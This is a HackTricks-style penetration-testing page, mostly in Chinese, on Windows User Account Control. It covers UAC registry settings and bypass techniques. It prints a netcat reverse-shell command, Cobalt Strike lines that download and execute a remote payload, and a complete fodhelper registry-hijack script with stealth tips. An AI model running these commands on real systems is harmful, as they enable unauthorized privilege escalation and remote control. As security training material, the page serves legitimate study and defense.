# UAC - 用户帐户控制

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，用于对提升操作显示 **同意提示（consent prompt for elevated activities）**。应用程序有不同的 `integrity` 等级，处于 **high level** 的程序可以执行可能 **危及系统** 的任务。当 UAC 启用时，应用程序和任务通常会 **在非管理员帐户的安全上下文下运行**，除非管理员显式授权这些应用/任务以管理员级别访问系统来运行。它是一个保护管理员免于无意更改的便捷功能，但不被视为安全边界。

有关 integrity levels 的更多信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

当 UAC 启用时，管理员用户会获得 2 个 token：一个是标准用户 token，用于以常规级别执行常规操作；另一个具有管理员权限。

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 详细讨论了 UAC 的工作原理，包括登录过程、用户体验和 UAC 架构。管理员可以使用安全策略在本地级别（使用 secpol.msc）配置 UAC 的工作方式，或者在 Active Directory 域环境中通过 Group Policy Objects (GPO) 配置并推送。各种设置在 [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) 中有详细讨论。可以为 UAC 设置 10 个组策略项。下表提供了更多细节：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

一些程序在用户属于 **administrator group** 时会被 **自动提升（autoelevated automatically）**。这些二进制文件在它们的 _**Manifests**_ 中包含 _**autoElevate**_ 选项且其值为 _**True**_。该二进制文件通常还需要由 Microsoft 签名。

许多 auto-elevate 进程通过 **COM objects 或 RPC servers** 暴露功能，可以从具有 medium integrity（常规用户级别权限）的进程中调用。注意 COM (Component Object Model) 和 RPC (Remote Procedure Call) 是 Windows 程序用于跨进程通信和执行功能的方法。例如，**`IFileOperation COM object`** 旨在处理文件操作（复制、删除、移动），并且可以在没有提示的情况下自动提升权限。

注意有些检查可能会被执行，例如检查进程是否从 **System32 目录** 运行，这可以通过例如 **向 explorer.exe 或另一个位于 System32 的可执行文件注入** 来绕过。

另一种绕过这些检查的方法是 **修改 PEB**。Windows 中的每个进程都有一个 Process Environment Block (PEB)，其中包含有关进程的重要数据，例如其可执行文件路径。通过修改 PEB，攻击者可以伪造（spoof）其恶意进程的位置，使其看起来像是从受信任的目录（例如 system32）运行。这种伪造的信息会欺骗 COM 对象在没有提示的情况下自动提升权限。

接着，为了 **绕过 UAC**（将权限从 **medium** 完全提升到 **high**），某些攻击者使用这类二进制文件来 **执行任意代码**，因为代码将会在 **high level integrity 进程** 中执行。

你可以使用 Sysinternals 的工具 _**sigcheck.exe**_ 检查二进制的 _**Manifest**_。（`sigcheck.exe -m <file>`）并且可以使用 _Process Explorer_ 或 _Process Monitor_（来自 Sysinternals）查看进程的 **integrity level**。

### Check UAC

要确认 UAC 是否已启用，请执行：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
如果它是 **`1`**，则 UAC 为 **已启用**；如果为 **`0`** 或不存在，则 UAC 为 **未启用**。

接着，检查配置了 **哪个级别**：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- 如果 **`0`**，则 UAC 不会提示（类似 **已禁用**）
- 如果 **`1`**，管理员会被**要求输入用户名和密码**以在高权限下执行该二进制（在安全桌面上）
- 如果 **`2`**（**始终通知我**），当管理员尝试以高权限执行某些操作时，UAC 会始终要求确认（在安全桌面上）
- 如果 **`3`**，类似 `1`，但在安全桌面上不是必须的
- 如果 **`4`**，类似 `2`，但在安全桌面上不是必须的
- 如果 **`5`**（**默认**），当以高权限运行非 Windows 二进制时，会要求管理员确认

然后，你需要查看 **`LocalAccountTokenFilterPolicy`** 的值\
如果该值为 **`0`**，则只有 **RID 500** 用户（**built-in Administrator**）能够执行**无需 UAC 的管理员任务**；如果为 `1`，**Administrators** 组内的所有账户都可以执行这些任务。

最后查看键 **`FilterAdministratorToken`** 的值\
如果为 **`0`**（默认），**内置 Administrator 帐户可以** 执行远程管理任务；如果为 **`1`**，内置 Administrator 帐户**无法** 执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 被设置为 `1`。

#### 摘要

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

你也可以检查你的用户所属的组并获取完整性级别：
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> 注意，如果你对受害者有图形界面访问，UAC bypass 非常简单，因为当 UAC 提示出现时你只需点击 "Yes"

The UAC bypass is needed in the following situation: **UAC 已启用，你的进程运行在中等完整性上下文（medium integrity context），并且你的用户属于管理员组（administrators group）**。

It is important to mention that it is **当 UAC 处于最高安全级别 (Always) 时，绕过 UAC 要比处于其他任何级别 (Default) 更困难得多。**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常** 基本的 UAC "bypass"（完全 file system 访问）

如果你有一个属于 Administrators group 的用户的 shell，你可以在本地将 C$ 共享通过 SMB 挂载为一个新的 disk，这样就可以访问 file system 中的所有内容（甚至 Administrator home folder）。

> [!WARNING]
> **看起来这个技巧现在已无法使用**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 cobalt strike 绕过 UAC

只有当 UAC 未设置为最高安全级别时，Cobalt Strike 技术才会生效。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有若干模块用于 **bypass** **UAC**。

### KRBUACBypass

文档和工具位于 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) 是多个 UAC bypass exploits 的 **汇总**。注意，你需要 **compile UACME using visual studio or msbuild**。编译将生成多个可执行文件（例如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），你需要知道 **哪个是你需要的。**\
你应该 **小心**，因为一些 bypasses 会 **触发其他程序的提示**，从而 **提醒** **用户** 有事情正在发生。

UACME 包含 **每种技术开始生效的 build 版本**。你可以搜索影响你所用版本的技术：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
另外，使用 [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 页面可以从 build 版本得到 Windows 发布 `1607`。

### UAC Bypass – fodhelper.exe (Registry hijack)

受信任的二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动时，它会查询下面的每用户注册表路径，但不会验证 `DelegateExecute` 动词。在该路径植入命令可以让一个 Medium Integrity 进程（用户属于 Administrators）在不弹出 UAC 提示的情况下生成一个 High Integrity 进程。

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell 步骤 (设置你的 payload，然后触发):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
注意：
- 当当前用户是 Administrators 成员且 UAC 级别为默认/宽松（不是 Always Notify 并附加额外限制）时有效。
- 在 64 位 Windows 上，从 32 位进程启动 64 位 PowerShell 时使用 `sysnative` 路径。
- Payload 可以是任何命令（PowerShell、cmd，或可执行文件路径）。为保持隐蔽性，避免弹出提示类 UI。

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

你可以使用一个 **meterpreter** 会话。迁移到一个 **process**，其 **Session** 值等于 **1**：

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

如果你能访问一个 **GUI**，当出现 UAC prompt 时你可以直接接受，实际上不需要绕过。因此，获得 GUI 访问即可绕过 UAC。

此外，如果你获得的是别人正在使用的 GUI 会话（例如通过 RDP），某些工具会以 administrator 身份运行，你可以直接从这些工具运行 cmd（例如 as admin），不会再次被 UAC 提示，如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能更为 **stealthy**。

### Noisy brute-force UAC bypass

如果你不在意噪声，可以运行类似 [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 的工具，不断请求提升权限直到用户接受。

### Your own bypass - Basic UAC bypass methodology

如果查看 **UACME**，你会注意到**大多数 UAC 绕过利用了 Dll Hijacking 漏洞**（主要是将恶意 dll 写入 _C:\Windows\System32_）。[Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. 找到一个会 **autoelevate** 的二进制（确认其执行时处于高完整性级别）。
2. 使用 procmon 查找可能易受 **DLL Hijacking** 影响的 "**NAME NOT FOUND**" 事件。
3. 你可能需要将 DLL 写入某些 **受保护路径**（如 C:\Windows\System32），在这些位置你没有写权限。你可以通过以下方式绕过：
   1. **wusa.exe**：适用于 Windows 7、8 和 8.1。它允许在受保护路径中解压 CAB 文件的内容（因为该工具以高完整性级别执行）。
   2. **IFileOperation**：Windows 10。
4. 准备一个 **script**，将你的 DLL 复制到受保护路径，并执行易受攻击且 autoelevated 的二进制。

### Another UAC bypass technique

该方法是监视某个 **autoElevated binary** 是否尝试从 **registry** 读取要 **执行** 的 **binary** 或 **command** 的 **name/path**（如果该二进制在 **HKCU** 中查找这类信息，则更为有趣）。

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
